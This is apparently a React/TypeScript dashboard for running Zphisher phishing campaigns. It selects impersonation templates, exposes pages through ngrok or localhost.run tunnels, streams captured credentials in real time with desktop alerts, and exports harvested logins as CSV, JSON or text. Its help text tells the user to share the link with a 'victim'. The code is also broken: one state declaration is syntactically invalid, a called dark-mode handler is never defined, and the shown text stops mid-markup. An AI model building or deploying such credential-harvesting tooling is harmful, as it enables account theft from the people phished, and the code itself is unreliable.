import React, { useState, useRef } from 'react';
import { io, Socket } from 'socket.io-client';

const TUNNELS = ['ngrok', 'localhost.run'];

interface SessionHistory {
  session_id: string;
  template: string;
  tunnel_type: string;
  public_url: string;
  status: string;
  credentials_count: number;
  start_time?: number;
  end_time?: number;
}

const ZphisherTool: React.FC = () => {
  const [template, setTemplate] = useState('');
  const [templates, setTemplates] = useState<string[]>([]);
  const [tunnel, setTunnel] = useState('ngrok');
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [status, setStatus] = useState<any>(null);
  const [output, setOutput] = useState<string[]>([]);
  const [credentials, setCredentials] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [templateLoading, setTemplateLoading] = useState(true);
  const [templateError, setTemplateError] = useState<string | null>(null);
  const [ngrokAvailable, setNgrokAvailable] = useState(true);
  const [sshAvailable, setSshAvailable] = useState(true);
  const [osType, setOsType] = useState<'windows' | 'linux' | null>(null);
  const [showHelp, setShowHelp] = useState(false);
  const [tab, setTab] = useState<'main' | 'history'>('main');
  const [history, setHistory] = useState<SessionHistory[]>([]);
  const [historyLoading, setHistoryLoading] = useState(false);
  const [selectedSession, setSelectedSession] = useState<any>(null);
  const [detailLoading, setDetailLoading] = useState(false);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const diagIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const socketRef = useRef<Socket | null>(null);
  const [templateSearch, setTemplateSearch] = useState('');
  const [favoriteTemplates, setFavoriteTemplates] = useState<string[]>(() => {
    try {
      return JSON.parse(localStorage.getItem('zphisher_favorites') || '[]');
    } catch {
      return [];
    }
  });
  const [wizardStep, setWizardStep] = useState<'template' | 'tunnel' | 'review' | 'running'>('template');
  const [wizardData, setWizardData] = useState({
    template: '',
    tunnel: 'ngrok',
    customPort: '',
    campaignName: '',
  });
  const [wizardErrors, setWizardErrors] = useState<Record<string, string>>({});
  const [showNotifications, setShowNotifications] = useState(true);
  const [terminalRef, useRef<HTMLDivElement>(null);
  const [credentialsRef, useRef<HTMLDivElement>(null);
  const [historyFilter, setHistoryFilter] = useState({
    template: '',
    status: '',
    hasCredentials: false,
    dateRange: 'all'
  });
  const [sessionTags, setSessionTags] = useState<Record<string, string>>(() => {
    try {
      return JSON.parse(localStorage.getItem('zphisher_session_tags') || '{}');
    } catch {
      return {};
    }
  });
  const [exportFormat, setExportFormat] = useState<'csv' | 'json' | 'txt'>('csv');
  const [darkMode, setDarkMode] = useState(() => {
    try {
      return localStorage.getItem('zphisher_dark_mode') === 'true';
    } catch {
      return false;
    }
  });

  // Toast notification for new credentials
  const showCredentialNotification = (credential: string) => {
    if (showNotifications && 'Notification' in window && Notification.permission === 'granted') {
      new Notification('New Credential Captured!', {
        body: credential,
        icon: '/favicon.ico'
      });
    }
  };

  // Copy to clipboard function
  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      // Could add a toast notification here
    } catch (err) {
      console.error('Failed to copy to clipboard:', err);
    }
  };

  // Auto-scroll terminal and credentials
  React.useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [output]);

  React.useEffect(() => {
    if (credentialsRef.current) {
      credentialsRef.current.scrollTop = credentialsRef.current.scrollHeight;
    }
  }, [credentials]);

  // Enhanced credential detection with notification
  React.useEffect(() => {
    if (credentials.length > 0) {
      const lastCredential = credentials[credentials.length - 1];
      showCredentialNotification(lastCredential);
    }
  }, [credentials]);

  const toggleFavorite = (tpl: string) => {
    setFavoriteTemplates(prev => {
      const updated = prev.includes(tpl) ? prev.filter(f => f !== tpl) : [...prev, tpl];
      localStorage.setItem('zphisher_favorites', JSON.stringify(updated));
      return updated;
    });
  };

  const filteredTemplates = templates.filter(t => t.toLowerCase().includes(templateSearch.toLowerCase()));
  const sortedTemplates = [
    ...favoriteTemplates.filter(f => filteredTemplates.includes(f)),
    ...filteredTemplates.filter(t => !favoriteTemplates.includes(t)),
  ];

  const validateWizardStep = (step: string) => {
    const errors: Record<string, string> = {};
    if (step === 'template' && !wizardData.template) {
      errors.template = 'Please select a template';
    }
    if (step === 'tunnel') {
      if (wizardData.tunnel === 'ngrok' && !ngrokAvailable) {
        errors.tunnel = 'ngrok is not available. Please install ngrok or select a different tunnel.';
      }
      if (wizardData.tunnel === 'localhost.run' && !sshAvailable) {
        errors.tunnel = 'SSH is not available. Please configure SSH or select a different tunnel.';
      }
    }
    setWizardErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const nextWizardStep = () => {
    if (validateWizardStep(wizardStep)) {
      if (wizardStep === 'template') setWizardStep('tunnel');
      else if (wizardStep === 'tunnel') setWizardStep('review');
      else if (wizardStep === 'review') {
        setWizardStep('running');
        setTemplate(wizardData.template);
        setTunnel(wizardData.tunnel);
        startSession();
      }
    }
  };

  const prevWizardStep = () => {
    if (wizardStep === 'tunnel') setWizardStep('template');
    else if (wizardStep === 'review') setWizardStep('tunnel');
    else if (wizardStep === 'running') setWizardStep('review');
  };

  // Fetch templates
  const fetchTemplates = async () => {
    setTemplateLoading(true);
    setTemplateError(null);
    try {
      const res = await fetch('/api/zphisher/templates');
      const data = await res.json();
      if (data.templates && data.templates.length > 0) {
        setTemplates(data.templates);
        setTemplate(data.templates[0]);
      } else {
        setTemplateError('No templates found.');
      }
    } catch (e) {
      setTemplateError('Failed to fetch templates.');
    }
    setTemplateLoading(false);
  };

  // Fetch tunnel diagnostics
  const fetchDiagnostics = async () => {
    try {
      const res = await fetch('/api/zphisher/diagnostics');
      const data = await res.json();
      setNgrokAvailable(!!data.ngrok_available);
      setSshAvailable(!!data.ssh_available);
      setOsType(data.os);
      if (!data.ngrok_available && tunnel === 'ngrok') setTunnel('localhost.run');
      if (!data.ssh_available && tunnel === 'localhost.run') setTunnel('ngrok');
    } catch {
      setNgrokAvailable(false);
      setSshAvailable(false);
      setOsType(null);
    }
  };

  // Fetch session history
  const fetchHistory = async () => {
    setHistoryLoading(true);
    try {
      const res = await fetch('/api/zphisher/history');
      const data = await res.json();
      setHistory(data.sessions || []);
    } catch {}
    setHistoryLoading(false);
  };

  // Fetch session detail
  const fetchSessionDetail = async (session_id: string) => {
    setDetailLoading(true);
    try {
      const res = await fetch(`/api/zphisher/history/${session_id}`);
      const data = await res.json();
      setSelectedSession(data);
    } catch {}
    setDetailLoading(false);
  };

  // Analytics
  const totalSessions = history.length;
  const sessionsWithCreds = history.filter(s => s.credentials_count > 0).length;
  const mostUsedTemplate = (() => {
    const counts: Record<string, number> = {};
    history.forEach(s => { counts[s.template] = (counts[s.template] || 0) + 1; });
    return Object.entries(counts).sort((a, b) => b[1] - a[1])[0]?.[0] || '-';
  })();

  const addSessionTag = (sessionId: string, tag: string) => {
    setSessionTags(prev => {
      const updated = { ...prev, [sessionId]: tag };
      localStorage.setItem('zphisher_session_tags', JSON.stringify(updated));
      return updated;
    });
  };

  const exportSession = async (sessionId: string, format: 'csv' | 'json' | 'txt') => {
    try {
      const res = await fetch(`/api/zphisher/history/${sessionId}`);
      const session = await res.json();
      
      let content = '';
      let filename = `zphisher_session_${sessionId}`;
      
      if (format === 'csv') {
        content = `Session ID,Template,Tunnel,Status,Start Time,End Time,Credentials Count\n`;
        content += `${session.session_id},${session.template},${session.tunnel_type},${session.status},`;
        content += `${session.start_time ? new Date(session.start_time * 1000).toISOString() : ''},`;
        content += `${session.end_time ? new Date(session.end_time * 1000).toISOString() : ''},`;
        content += `${session.credentials?.length || 0}\n\n`;
        if (session.credentials?.length) {
          content += `Credentials\n`;
          session.credentials.forEach((cred: string) => {
            content += `"${cred.replace(/"/g, '""')}"\n`;
          });
        }
        filename += '.csv';
      } else if (format === 'json') {
        content = JSON.stringify(session, null, 2);
        filename += '.json';
      } else {
        content = `Zphisher Session Report\n`;
        content += `Session ID: ${session.session_id}\n`;
        content += `Template: ${session.template}\n`;
        content += `Tunnel: ${session.tunnel_type}\n`;
        content += `Status: ${session.status}\n`;
        content += `Start Time: ${session.start_time ? new Date(session.start_time * 1000).toLocaleString() : 'N/A'}\n`;
        content += `End Time: ${session.end_time ? new Date(session.end_time * 1000).toLocaleString() : 'N/A'}\n`;
        content += `Credentials Count: ${session.credentials?.length || 0}\n\n`;
        if (session.credentials?.length) {
          content += `Credentials:\n`;
          session.credentials.forEach((cred: string) => {
            content += `${cred}\n`;
          });
        }
        if (session.output?.length) {
          content += `\nOutput:\n`;
          session.output.forEach((line: string) => {
            content += `${line}\n`;
          });
        }
        filename += '.txt';
      }
      
      const blob = new Blob([content], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = filename;
      a.click();
      URL.revokeObjectURL(url);
    } catch (err) {
      console.error('Export failed:', err);
    }
  };

  const filteredHistory = history.filter(s => {
    if (historyFilter.template && !s.template.toLowerCase().includes(historyFilter.template.toLowerCase())) return false;
    if (historyFilter.status && s.status !== historyFilter.status) return false;
    if (historyFilter.hasCredentials && s.credentials_count === 0) return false;
    if (historyFilter.dateRange !== 'all') {
      const sessionDate = s.start_time ? new Date(s.start_time * 1000) : new Date(0);
      const now = new Date();
      const diffDays = (now.getTime() - sessionDate.getTime()) / (1000 * 60 * 60 * 24);
      if (historyFilter.dateRange === 'today' && diffDays > 1) return false;
      if (historyFilter.dateRange === 'week' && diffDays > 7) return false;
      if (historyFilter.dateRange === 'month' && diffDays > 30) return false;
    }
    return true;
  });

  // On mount: fetch templates and diagnostics, and poll diagnostics every 10s
  React.useEffect(() => {
    fetchTemplates();
    fetchDiagnostics();
    diagIntervalRef.current = setInterval(fetchDiagnostics, 10000);
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
      if (diagIntervalRef.current) clearInterval(diagIntervalRef.current);
      if (socketRef.current) socketRef.current.disconnect();
    };
  }, []);

  // Auto-refresh templates every 30 seconds
  React.useEffect(() => {
    fetchTemplates();
    const templateInterval = setInterval(fetchTemplates, 30000);
    return () => clearInterval(templateInterval);
  }, []);

  // Real-time output streaming
  React.useEffect(() => {
    if (!sessionId) return;
    // Connect to Socket.IO backend
    const socket = io('/', { transports: ['websocket'] });
    socketRef.current = socket;
    socket.emit('join', { session_id: sessionId });
    socket.on('zphisher_output', (data: any) => {
      if (data.session_id !== sessionId) return;
      setOutput(prev => [...prev, data.line]);
      if (data.credentials) setCredentials(prev => prev.includes(data.credentials) ? prev : [...prev, data.credentials]);
    });
    return () => {
      socket.disconnect();
    };
  }, [sessionId]);

  const startSession = async () => {
    setLoading(true);
    setError(null);
    setOutput([]);
    setCredentials([]);
    try {
      const res = await fetch('/api/zphisher/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ template, tunnel })
      });
      const data = await res.json();
      if (data.session_id) {
        setSessionId(data.session_id);
        pollStatus(data.session_id);
        intervalRef.current = setInterval(() => pollStatus(data.session_id), 2000);
      } else {
        setError(data.error || 'Failed to start session');
      }
    } catch (e) {
      setError('Failed to start session');
    }
    setLoading(false);
  };

  const pollStatus = async (id: string) => {
    const res = await fetch(`/api/zphisher/status?session_id=${id}`);
    const data = await res.json();
    setStatus(data);
  };

  const stopSession = async () => {
    if (!sessionId) return;
    setLoading(true);
    await fetch('/api/zphisher/stop', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: sessionId })
    });
    setSessionId(null);
    setStatus(null);
    setOutput([]);
    setCredentials([]);
    setLoading(false);
    if (intervalRef.current) clearInterval(intervalRef.current);
    if (socketRef.current) socketRef.current.disconnect();
  };

  // Keyboard navigation support
  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Escape') {
      setSelectedSession(null);
      setShowHelp(false);
    }
  };

  // Focus management for accessibility
  const focusFirstElement = () => {
    const firstButton = document.querySelector('button, input, select') as HTMLElement;
    if (firstButton) firstButton.focus();
  };

  React.useEffect(() => {
    focusFirstElement();
  }, [tab]);

  return (
    <div 
      className={`max-w-4xl mx-auto py-8 px-4 transition-colors duration-200 ${
        darkMode ? 'bg-gray-900 text-white' : 'bg-gray-50 text-gray-900'
      }`}
      onKeyDown={handleKeyDown}
      role="main"
      aria-label="Zphisher Social Engineering Tool"
    >
      {/* Header with Dark Mode Toggle */}
      <div className="flex items-center justify-between mb-8">
        <div>
          <h1 className={`text-3xl font-bold mb-2 ${darkMode ? 'text-white' : 'text-gray-900'}`}>
            🎣 Zphisher Social Engineering
          </h1>
          <p className={`text-sm ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>
            Advanced phishing campaign management and monitoring
          </p>
        </div>
        <button
          onClick={toggleDarkMode}
          className={`p-2 rounded-lg transition-colors ${
            darkMode ? 'bg-gray-700 hover:bg-gray-600 text-yellow-300' : 'bg-white hover:bg-gray-100 text-gray-700'
          } shadow-sm`}
          aria-label={`Switch to ${darkMode ? 'light' : 'dark'} mode`}
          title={`Switch to ${darkMode ? 'light' : 'dark'} mode`}
        >
          {darkMode ? '☀️' : '🌙'}
        </button>
      </div>

      {/* Dashboard Overview */}
      <div className={`grid grid-cols-1 md:grid-cols-4 gap-4 mb-8 ${
        darkMode ? 'text-white' : ''
      }`}>
        <div className={`rounded-lg shadow-lg p-4 flex flex-col items-center transition-all hover:scale-105 ${
          darkMode ? 'bg-gray-800 border border-gray-700' : 'bg-blue-50 border border-blue-200'
        }`}>
          <span className={`text-3xl font-bold ${darkMode ? 'text-blue-400' : 'text-blue-700'}`}>{totalSessions}</span>
          <span className={`text-xs mt-1 ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Total Sessions</span>
        </div>
        <div className={`rounded-lg shadow-lg p-4 flex flex-col items-center transition-all hover:scale-105 ${
          darkMode ? 'bg-gray-800 border border-gray-700' : 'bg-green-50 border border-green-200'
        }`}>
          <span className={`text-3xl font-bold ${darkMode ? 'text-green-400' : 'text-green-700'}`}>{sessionsWithCreds}</span>
          <span className={`text-xs mt-1 ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Sessions with Credentials</span>
        </div>
        <div className={`rounded-lg shadow-lg p-4 flex flex-col items-center transition-all hover:scale-105 ${
          darkMode ? 'bg-gray-800 border border-gray-700' : 'bg-yellow-50 border border-yellow-200'
        }`}>
          <span className={`text-2xl font-bold ${darkMode ? 'text-yellow-400' : 'text-yellow-700'}`}>{mostUsedTemplate}</span>
          <span className={`text-xs mt-1 ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Most Used Template</span>
        </div>
        <div className={`rounded-lg shadow-lg p-4 flex flex-col items-center transition-all hover:scale-105 ${
          darkMode ? 'bg-gray-800 border border-gray-700' : 'bg-purple-50 border border-purple-200'
        }`}>
          <span className={`text-3xl font-bold ${darkMode ? 'text-purple-400' : 'text-purple-700'}`}>{history.filter(s => s.status === 'active').length}</span>
          <span className={`text-xs mt-1 ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Active Sessions</span>
        </div>
      </div>

      {/* Recent Activity Timeline */}
      <div className={`mb-8 ${darkMode ? 'text-white' : ''}`}>
        <h2 className="text-xl font-semibold mb-4 flex items-center">
          <span className="mr-2">📊</span>
          Recent Activity
        </h2>
        <div className={`rounded-lg shadow-lg overflow-hidden ${
          darkMode ? 'bg-gray-800 border border-gray-700' : 'bg-white border border-gray-200'
        }`}>
          <ul className="divide-y divide-gray-200">
            {history.slice(0, 5).map(s => (
              <li key={s.session_id} className={`p-4 flex items-center justify-between hover:bg-opacity-50 ${
                darkMode ? 'hover:bg-gray-700 border-gray-700' : 'hover:bg-gray-50 border-gray-200'
              }`}>
                <div className="flex items-center space-x-3">
                  <div className={`w-2 h-2 rounded-full ${
                    s.status === 'active' ? 'bg-green-500 animate-pulse' : 'bg-gray-400'
                  }`}></div>
                  <div>
                    <span className={`font-semibold ${darkMode ? 'text-blue-400' : 'text-blue-700'}`}>{s.template}</span>
                    <div className={`text-xs ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                      {s.tunnel_type} • {s.status} • {s.credentials_count} credentials
                    </div>
                  </div>
                </div>
                <div className={`text-xs ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                  {s.start_time ? new Date(s.start_time * 1000).toLocaleString() : '-'}
                </div>
              </li>
            ))}
            {history.length === 0 && (
              <li className={`p-4 text-center ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                No recent activity.
              </li>
            )}
          </ul>
        </div>
      </div>

      {/* Navigation Tabs */}
      <div className="flex gap-2 mb-6" role="tablist" aria-label="Zphisher tool sections">
        <button
          className={`px-6 py-3 rounded-lg font-semibold transition-all ${
            tab === 'main' 
              ? `${darkMode ? 'bg-blue-600 text-white shadow-lg' : 'bg-blue-600 text-white shadow-lg'}`
              : `${darkMode ? 'bg-gray-700 text-gray-300 hover:bg-gray-600' : 'bg-white text-gray-700 hover:bg-gray-50'}`
          }`}
          onClick={() => setTab('main')}
          role="tab"
          aria-selected={tab === 'main'}
          aria-controls="main-panel"
        >
          🚀 Main Tool
        </button>
        <button
          className={`px-6 py-3 rounded-lg font-semibold transition-all ${
            tab === 'history' 
              ? `${darkMode ? 'bg-blue-600 text-white shadow-lg' : 'bg-blue-600 text-white shadow-lg'}`
              : `${darkMode ? 'bg-gray-700 text-gray-300 hover:bg-gray-600' : 'bg-white text-gray-700 hover:bg-gray-50'}`
          }`}
          onClick={() => { setTab('history'); fetchHistory(); }}
          role="tab"
          aria-selected={tab === 'history'}
          aria-controls="history-panel"
        >
          📋 Session History
        </button>
      </div>

      {/* Main Content */}
      <div role="tabpanel" id="main-panel" aria-labelledby="main-tab" className={tab === 'main' ? 'block' : 'hidden'}>
          <h1 className="text-2xl font-bold mb-6 flex items-center gap-2">
            Zphisher Social Engineering Tool
            <button
              className="ml-2 text-blue-600 underline text-sm"
              onClick={() => setShowHelp(h => !h)}
            >
              {showHelp ? 'Hide Help' : 'How to use?'}
            </button>
          </h1>
          {showHelp && (
            <div className="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6 rounded text-blue-900 text-sm">
              <strong>How to use:</strong>
              <ol className="list-decimal ml-6 mt-2 space-y-1">
                <li>Select a phishing template and tunnel type. <span title="ngrok is more reliable if available." className="underline cursor-help">(?)</span></li>
                <li>Click <b>Start Session</b>. Wait for the phishing link to appear.</li>
                <li>Share the link with your test victim. Captured credentials will appear below.</li>
                <li>Click <b>Stop Session</b> to terminate Zphisher and the tunnel.</li>
              </ol>
              <div className="mt-2 text-xs text-gray-700">
                <b>Tip:</b> If ngrok or localhost.run is not available, check your system PATH or install them.<br />
                <b>Note:</b> On Windows, WSL is required for Zphisher and SSH tunneling.
              </div>
            </div>
          )}
          {error && <div className="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-4 rounded">{error}</div>}
          {/* Campaign Wizard */}
          <div className={`rounded-lg shadow-lg p-6 mb-6 ${
            darkMode ? 'bg-gray-800 border border-gray-700' : 'bg-white border border-gray-200'
          }`}>
            <h2 className="text-xl font-semibold mb-4 flex items-center">
              <span className="mr-2">⚡</span>
              Campaign Wizard
            </h2>
            <div className="flex items-center mb-6">
              {['template', 'tunnel', 'review', 'running'].map((step, idx) => (
                <div key={step} className="flex items-center">
                  <div className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-semibold transition-all ${
                    wizardStep === step 
                      ? 'bg-blue-600 text-white shadow-lg scale-110' 
                      : ['template', 'tunnel', 'review', 'running'].indexOf(wizardStep) > idx 
                        ? 'bg-green-600 text-white' 
                        : darkMode ? 'bg-gray-600 text-gray-300' : 'bg-gray-200 text-gray-600'
                  }`}>
                    {idx + 1}
                  </div>
                  {idx < 3 && <div className={`w-8 h-1 mx-2 ${
                    ['template', 'tunnel', 'review', 'running'].indexOf(wizardStep) > idx 
                      ? 'bg-green-500' 
                      : darkMode ? 'bg-gray-600' : 'bg-gray-200'
                  }`}></div>}
                </div>
              ))}
            </div>
            {wizardStep === 'template' && (
              <div>
                <h3 className="font-semibold mb-4 flex items-center">
                  <span className="mr-2">📋</span>
                  Step 1: Select Template
                </h3>
                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-3 max-h-64 overflow-y-auto">
                  {templates.map(tpl => (
                    <div 
                      key={tpl} 
                      className={`p-4 rounded-lg border cursor-pointer transition-all hover:scale-105 ${
                        wizardData.template === tpl 
                          ? darkMode ? 'border-blue-500 bg-blue-900/20' : 'border-blue-500 bg-blue-50'
                          : darkMode ? 'border-gray-600 hover:border-gray-500' : 'border-gray-200 hover:border-gray-300'
                      }`}
                      onClick={() => setWizardData(prev => ({ ...prev, template: tpl }))}
                      role="button"
                      tabIndex={0}
                      onKeyDown={(e) => e.key === 'Enter' && setWizardData(prev => ({ ...prev, template: tpl }))}
                      aria-label={`Select template: ${tpl}`}
                    >
                      <div className="font-semibold">{tpl}</div>
                      <div className={`text-xs ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                        Phishing page for {tpl}
                      </div>
                    </div>
                  ))}
                </div>
                {wizardErrors.template && (
                  <div className="mt-3 p-3 bg-red-100 border border-red-400 rounded text-red-700 text-sm">
                    ⚠️ {wizardErrors.template}
                  </div>
                )}
              </div>
            )}
            {wizardStep === 'tunnel' && (
              <div>
                <h3 className="font-semibold mb-4 flex items-center">
                  <span className="mr-2">🌐</span>
                  Step 2: Configure Tunnel
                </h3>
                <div className="space-y-4">
                  <div>
                    <label className="block font-semibold mb-2">Tunnel Type</label>
                    <select
                      className={`w-full border rounded-lg px-4 py-3 transition-colors ${
                        darkMode ? 'bg-gray-700 border-gray-600 text-white' : 'bg-white border-gray-300'
                      }`}
                      value={wizardData.tunnel}
                      onChange={e => setWizardData(prev => ({ ...prev, tunnel: e.target.value }))}
                      aria-label="Select tunnel type"
                    >
                      <option value="ngrok" disabled={!ngrokAvailable}>
                        ngrok {!ngrokAvailable && '(not available)'}
                      </option>
                      <option value="localhost.run" disabled={!sshAvailable}>
                        localhost.run {!sshAvailable && '(not available)'}
                      </option>
                    </select>
                  </div>
                  <div>
                    <label className="block font-semibold mb-2">Custom Port (optional)</label>
                    <input
                      type="text"
                      className={`w-full border rounded-lg px-4 py-3 transition-colors ${
                        darkMode ? 'bg-gray-700 border-gray-600 text-white' : 'bg-white border-gray-300'
                      }`}
                      placeholder="8080"
                      value={wizardData.customPort}
                      onChange={e => setWizardData(prev => ({ ...prev, customPort: e.target.value.replace(/[^0-9]/g, '') }))}
                      aria-label="Enter custom port number"
                    />
                  </div>
                  <div>
                    <label className="block font-semibold mb-2">Campaign Name (optional)</label>
                    <input
                      type="text"
                      className={`w-full border rounded-lg px-4 py-3 transition-colors ${
                        darkMode ? 'bg-gray-700 border-gray-600 text-white' : 'bg-white border-gray-300'
                      }`}
                      placeholder="My Phishing Campaign"
                      value={wizardData.campaignName}
                      onChange={e => setWizardData(prev => ({ ...prev, campaignName: e.target.value }))}
                      aria-label="Enter campaign name"
                    />
                  </div>
                </div>
                {wizardErrors.tunnel && (
                  <div className="mt-3 p-3 bg-red-100 border border-red-400 rounded text-red-700 text-sm">
                    ⚠️ {wizardErrors.tunnel}
                  </div>
                )}
              </div>
            )}
            {wizardStep === 'review' && (
              <div>
                <h3 className="font-semibold mb-4 flex items-center">
                  <span className="mr-2">✅</span>
                  Step 3: Review Campaign
                </h3>
                <div className={`rounded-lg p-4 space-y-3 ${
                  darkMode ? 'bg-gray-700 border border-gray-600' : 'bg-gray-50 border border-gray-200'
                }`}>
                  <div className="flex justify-between">
                    <span className="font-semibold">Template:</span>
                    <span>{wizardData.template}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-semibold">Tunnel:</span>
                    <span>{wizardData.tunnel}</span>
                  </div>
                  {wizardData.customPort && (
                    <div className="flex justify-between">
                      <span className="font-semibold">Port:</span>
                      <span>{wizardData.customPort}</span>
                    </div>
                  )}
                  {wizardData.campaignName && (
                    <div className="flex justify-between">
                      <span className="font-semibold">Campaign:</span>
                      <span>{wizardData.campaignName}</span>
                    </div>
                  )}
                </div>
                <div className={`mt-4 p-4 rounded-lg ${
                  darkMode ? 'bg-blue-900/20 border border-blue-500' : 'bg-blue-50 border border-blue-200'
                }`}>
                  <div className="flex items-center">
                    <span className="mr-2">🚀</span>
                    <span className="font-semibold">Ready to launch!</span>
                  </div>
                  <p className={`text-sm mt-1 ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>
                    Click "Start Campaign" to begin the phishing attack.
                  </p>
                </div>
              </div>
            )}
            {wizardStep === 'running' && (
              <div>
                <h3 className="font-semibold mb-4 flex items-center">
                  <span className="mr-2">⚡</span>
                  Campaign Running
                </h3>
                <div className={`p-4 rounded-lg ${
                  darkMode ? 'bg-green-900/20 border border-green-500' : 'bg-green-50 border border-green-200'
                }`}>
                  <div className="flex items-center">
                    <span className="mr-2">✅</span>
                    <span className="font-semibold">Campaign started!</span>
                  </div>
                  <p className={`text-sm mt-1 ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>
                    Monitor the session below for real-time updates.
                  </p>
                </div>
              </div>
            )}
            <div className="flex justify-between mt-6">
              <button
                className={`px-6 py-3 rounded-lg font-semibold transition-all ${
                  darkMode ? 'bg-gray-600 hover:bg-gray-500 text-white' : 'bg-gray-200 hover:bg-gray-300 text-gray-700'
                } disabled:opacity-50`}
                onClick={prevWizardStep}
                disabled={wizardStep === 'template'}
                aria-label="Go to previous step"
              >
                ← Previous
              </button>
              <button
                className={`px-6 py-3 rounded-lg font-semibold transition-all ${
                  darkMode ? 'bg-blue-600 hover:bg-blue-500 text-white' : 'bg-blue-600 hover:bg-blue-700 text-white'
                } disabled:opacity-50`}
                onClick={nextWizardStep}
                disabled={wizardStep === 'running' || loading}
                aria-label={wizardStep === 'review' ? 'Start campaign' : 'Go to next step'}
              >
                {wizardStep === 'review' ? '🚀 Start Campaign' : 'Next →'}
              </button>
            </div>
          </div>
          {/* Template Gallery */}
          <div className="mb-10">
            <h2 className="text-lg font-semibold mb-2">Template Gallery</h2>
            <input
              type="text"
              className="border rounded px-3 py-2 mb-4 w-full"
              placeholder="Search templates..."
              value={templateSearch}
              onChange={e => setTemplateSearch(e.target.value)}
            />
            <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
              {sortedTemplates.map(tpl => (
                <div key={tpl} className={`rounded shadow p-4 flex flex-col items-center border ${template === tpl ? 'border-blue-500' : 'border-transparent'}`}
                     style={{ background: '#f9fafb' }}>
                  <div className="w-20 h-20 bg-gray-200 rounded mb-2 flex items-center justify-center">
                    {/* Placeholder for preview image */}
                    <span className="text-3xl text-gray-400">📄</span>
                  </div>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="font-semibold text-center">{tpl}</span>
                    <button
                      className={`text-xl ${favoriteTemplates.includes(tpl) ? 'text-yellow-400' : 'text-gray-300'} hover:text-yellow-500`}
                      onClick={() => toggleFavorite(tpl)}
                      title={favoriteTemplates.includes(tpl) ? 'Unfavorite' : 'Favorite'}
                      aria-label="Favorite"
                    >★</button>
                  </div>
                  <div className="text-xs text-gray-500 mb-2 text-center">Phishing page for {tpl} (description coming soon)</div>
                  <button
                    className={`px-3 py-1 rounded text-xs font-semibold ${template === tpl ? 'bg-blue-600 text-white' : 'bg-blue-100 text-blue-700 hover:bg-blue-200'}`}
                    onClick={() => setTemplate(tpl)}
                    disabled={!!sessionId}
                  >{template === tpl ? 'Selected' : 'Select'}</button>
                </div>
              ))}
              {sortedTemplates.length === 0 && (
                <div className="col-span-full text-gray-400 text-center">No templates found.</div>
              )}
            </div>
          </div>
          <div className="bg-white rounded shadow p-6 mb-6">
            <div className="mb-4 flex flex-col md:flex-row gap-4">
              <div className="flex-1">
                <label className="block font-semibold mb-1">Template
                  <span className="ml-1 text-xs text-gray-400" title="Choose the phishing page to use.">?</span>
                </label>
                {templateLoading ? (
                  <div className="text-gray-500">Loading templates...</div>
                ) : templateError ? (
                  <div className="text-red-600">{templateError}</div>
                ) : (
                  <div className="flex gap-2 items-center">
                    <select
                      className="w-full border rounded px-3 py-2"
                      value={template}
                      onChange={e => setTemplate(e.target.value)}
                      disabled={!!sessionId}
                    >
                      {templates.map(t => <option key={t} value={t}>{t}</option>)}
                    </select>
                    <button
                      className="px-2 py-1 bg-blue-100 text-blue-700 rounded hover:bg-blue-200 text-xs font-semibold"
                      onClick={fetchTemplates}
                      disabled={templateLoading || !!sessionId}
                      title="Refresh templates"
                    >
                      Refresh
                    </button>
                  </div>
                )}
              </div>
              <div className="flex-1">
                <label className="block font-semibold mb-1">Tunnel
                  <span className="ml-1 text-xs text-gray-400" title="ngrok is more reliable if available. localhost.run uses SSH.">?</span>
                </label>
                <select
                  className="w-full border rounded px-3 py-2"
                  value={tunnel}
                  onChange={e => setTunnel(e.target.value)}
                  disabled={!!sessionId || (!ngrokAvailable && tunnel === 'ngrok') || (!sshAvailable && tunnel === 'localhost.run')}
                >
                  {TUNNELS.map(t => (
                    <option key={t} value={t} disabled={
                      (t === 'ngrok' && !ngrokAvailable) ||
                      (t === 'localhost.run' && !sshAvailable)
                    }>
                      {t === 'ngrok' && !ngrokAvailable ? 'ngrok (not available)' :
                       t === 'localhost.run' && !sshAvailable ? 'localhost.run (not available)' : t}
                    </option>
                  ))}
                </select>
                <div className="text-xs text-gray-600 mt-1">
                  <span className={ngrokAvailable ? 'text-green-700' : 'text-red-600'}>ngrok: {ngrokAvailable ? 'Available' : 'Not available'}</span>
                  {' | '}
                  <span className={sshAvailable ? 'text-green-700' : 'text-red-600'}>localhost.run: {sshAvailable ? 'Available' : 'Not available'}</span>
                  {' | '}
                  <span className="text-blue-700">OS: {osType || '...'}</span>
                </div>
              </div>
            </div>
            <div className="flex gap-4">
              <button
